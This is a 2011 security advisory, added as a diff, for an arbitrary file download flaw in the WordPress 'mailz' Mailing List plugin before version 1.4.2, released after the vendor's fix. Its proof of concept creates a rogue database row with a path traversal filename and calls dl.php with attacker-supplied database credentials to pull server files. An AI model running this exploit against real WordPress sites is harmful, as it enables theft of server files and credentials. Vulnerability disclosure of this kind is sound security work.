@@ -1,0 +1,35 @@
+#Exploit Title: Mailing List plugin for Wordpress Arbitrary file download
+#Version:  < 1.4.2
+#Date: 2011-12-19
+#Author: 6Scan (http://6scan.com) security team
+#Software Link: http://wordpress.org/extend/plugins/mailz/
+#Official fix: This advisory is released after the vendor (http://www.zingiri.com)  was contacted and fixed the issue promptly.
+#Description :  Unauthorized users can download arbitrary files from the server using this exploit.
+#                                                             Vulnerable script includes config.php file, which connects to database with supplied credentials. Database entries are used to retrieve files from host.
+#                                                             The bug is in config.php, but accessible from other file.
+
+PoC
+1) Setup mysql database
+2) Create table with the next structure:
+CREATE TABLE IF NOT EXISTS `phplist_attachment` (
+  `filename` varchar(1024) NOT NULL,
+  `mimetype` varchar(1024) NOT NULL,
+  `remotefile` varchar(1024) NOT NULL,
+  `description` varchar(1024) NOT NULL,
+  `size` int(11) NOT NULL,
+  `id` int(11) NOT NULL
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+
+3) Add this raw into database:
+INSERT INTO `phplist_attachment` (`filename`, `mimetype`, `remotefile`, `description`, `size`, `id`) VALUES
+('../../../../../somefile.txt', '', '', '', 0, 0);
+
+
+4) Call the script with database parameters and file id to download:
+
+http://192.168.0.1/wp-content/plugins/mailz/lists/dl.php?wph=localhost&wpdb=test&user=root&wpp=root&id=0
+
+The credentials are now saved in session, and there is no need to continue passing them:
+http://192.168.0.1/wp-content/plugins/mailz/lists/dl.php?id=1
+http://192.168.0.1/wp-content/plugins/mailz/lists/dl.php?id=2
+http://192.168.0.1/wp-content/plugins/mailz/lists/dl.php?id=3
